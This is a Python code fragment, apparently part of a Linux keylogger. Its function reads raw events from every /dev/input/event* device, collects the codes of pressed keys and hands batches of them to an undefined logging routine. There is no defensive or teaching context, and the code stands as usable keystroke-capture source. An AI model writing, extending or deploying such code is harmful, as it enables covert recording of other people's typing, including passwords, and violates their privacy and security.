import struct, glob
def run_linux_logger(stop_event):
    buffer = []
    for device in glob.glob("/dev/input/event*"):
        try:
            with open(device, "rb") as f:
                while not stop_event.is_set():
                    event = f.read(24)
                    if not event: break
                    _, _, type, code, value = struct.unpack('llHHi', event)
                    if type == 1 and value == 1:
                        buffer.append(str(code))
                        if len(buffer) > 50: finalize_log(" ".join(buffer)); buffer.clear() # type: ignore
        except: continue
